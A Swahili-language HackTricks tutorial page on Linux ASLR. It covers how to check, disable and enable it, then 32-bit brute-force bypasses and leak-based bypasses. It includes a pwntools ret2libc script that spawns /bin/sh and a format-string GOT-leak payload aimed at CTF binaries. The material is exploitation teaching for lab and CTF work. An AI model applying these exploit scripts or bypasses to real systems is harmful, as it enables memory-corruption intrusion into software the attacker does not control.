# ASLR

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

**Urambazaji wa Mfumo wa Nafasi ya Anwani (ASLR)** ni mbinu ya usalama inayotumika kwenye mifumo ya uendeshaji kwa kuchanganya **anwani za kumbukumbu** zinazotumiwa na michakato ya mfumo na maombi. Kwa kufanya hivyo, inafanya iwe ngumu sana kwa mkaidi kutabiri mahali pa michakato na data maalum, kama vile stack, heap, na maktaba, hivyo kupunguza aina fulani za mbinu za kudukua, hasa mlipuko wa ujazo.

### **Kuangalia Hali ya ASLR**

Ku **angalia** hali ya ASLR kwenye mfumo wa Linux, unaweza kusoma thamani kutoka faili ya `/proc/sys/kernel/randomize_va_space`. Thamani iliyohifadhiwa kwenye faili hii inaamua aina ya ASLR inayotumiwa:

* **0**: Hakuna kuchanganyikiwa. Kila kitu ni tuli.
* **1**: Urambazaji wa kuchanganyikiwa wa kiasi. Maktaba zilizoshirikiwa, stack, mmap(), ukurasa wa VDSO zinachanganyikiwa.
* **2**: Urambazaji kamili. Mbali na vitu vilivyochanganyikiwa na urambazaji wa kiasi, kumbukumbu inayosimamiwa kupitia `brk()` inachanganyikiwa.

Unaweza kuangalia hali ya ASLR kwa amri ifuatayo:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Kulemaza ASLR**

Ili **kulemaza** ASLR, weka thamani ya `/proc/sys/kernel/randomize_va_space` kuwa **0**. Kulemaza ASLR kwa ujumla siyo jambo linalopendekezwa isipokuwa katika mazingira ya majaribio au kutatua matatizo. Hapa ndivyo unavyoweza kulemaza:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Unaweza pia kulemaza ASLR kwa utekelezaji na:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Kuwezesha ASLR**

Ili **kuwezesha** ASLR, unaweza kuandika thamani ya **2** kwenye faili ya `/proc/sys/kernel/randomize_va_space`. Kawaida hii inahitaji mamlaka ya mzizi. Kuwezesha ubadilishaji kamili unaweza kufanywa kwa amri ifuatayo:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Uthabiti Kupitia Kuzimwa Upya**

Mabadiliko yaliyofanywa kwa kutumia amri za `echo` ni ya muda na yatarejeshwa wakati wa kuzimwa upya. Ili kufanya mabadiliko yawe ya kudumu, unahitaji kuhariri faili ya `/etc/sysctl.conf` na kuongeza au kuhariri mstari ufuatao:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Baada ya kuhariri `/etc/sysctl.conf`, tumia mabadiliko kwa:
```bash
sudo sysctl -p
```
Hii itahakikisha mipangilio yako ya ASLR inabaki hata baada ya kuzimwa na kuzimwa upya.

## **Kupita**

### Kufanya nguvu kwa biti 32

PaX inagawa nafasi ya anwani ya mchakato katika **makundi 3**:

* **Msimbo na data** (iliyoanzishwa na isiyoanzishwa): `.text`, `.data`, na `.bss` ‚Äî> **biti 16** za entropy katika kipengele cha `delta_exec`. Kipengele hiki kinaanzishwa kwa nasibu kila mchakato na kuongezwa kwa anwani za awali.
* **Kumbukumbu** iliyotengwa na `mmap()` na **maktaba zinazoshirikiwa** ‚Äî> **biti 16**, inayoitwa `delta_mmap`.
* **Mtungo** ‚Äî> **biti 24**, inayoitwa `delta_stack`. Walakini, inatumia **biti 11** kwa ufanisi (kutoka kwa byte ya 10 hadi ya 20 pamoja), imepangwa kwa **biti 16** ‚Äî> Hii inasababisha **anwani halisi 524,288 za mtungo**.

Data iliyotangulia ni kwa mifumo ya biti 32 na entropy iliyopunguzwa mwishowe inawezesha kuvuka ASLR kwa kujaribu tena na tena hadi shambulio litakapokamilika kwa mafanikio.

#### Mawazo ya kufanya nguvu:

* Ikiwa una kutosha kwa kutosha kuhifadhi **kifuniko kikubwa cha NOP kabla ya msimbo wa kabati**, unaweza tu kufanya nguvu anwani kwenye mtungo hadi mchakato **unapovuka sehemu ya kifuniko cha NOP**.
* Chaguo lingine kwa hili ikiwa kujazwa sio kubwa na shambulio linaweza kutekelezwa kwa ndani ni kuingiza **kifuniko cha NOP na msimbo wa kabati katika mazingira ya pembejeo**.
* Ikiwa shambulio ni la ndani, unaweza kujaribu kufanya nguvu kwa anwani ya msingi ya libc (yenye manufaa kwa mifumo ya biti 32):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Kama unashambulia seva ya mbali, unaweza kujaribu **kuburuta anwani ya kazi ya `libc` ya `usleep`**, ukitoa kama hoja 10 (kwa mfano). Ikiwa wakati fulani **seva inachukua sekunde 10 zaidi kujibu**, umepata anwani ya kazi hii.

{% hint style="success" %}
Katika mifumo ya 64bit entropy ni kubwa zaidi na hili halikubaliki.
{% endhint %}

### Ukiwa na uvujaji

* **Changamoto ni kutoa uvujaji**

Ukipewa uvujaji (changamoto rahisi za CTF), unaweza kuhesabu makadirio kutoka kwake (ukidhani kwa mfano unajua toleo sahihi la libc linalotumiwa kwenye mfumo unaoexploit). Udukuzi huu wa mfano umetolewa kutoka [**mfano kutoka hapa**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (angalia ukurasa huo kwa maelezo zaidi):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Kwa kutumia kuzidi kwa buffer, ingewezekana kutumia **ret2plt** kufichua anwani ya kazi kutoka kwa libc. Angalia:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Kama ilivyo kwa ret2plt, ikiwa una usomaji wa kiholela kupitia udhaifu wa format strings, ni rahisi kufichua anwani ya kazi ya **libc function** kutoka kwa GOT. Mfano ufuatao [**unapatikana hapa**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Unaweza kupata habari zaidi kuhusu Format Strings arbitrary read katika:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret

Jaribu kukiuka ASLR kwa kutumia anwani ndani ya stack:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}
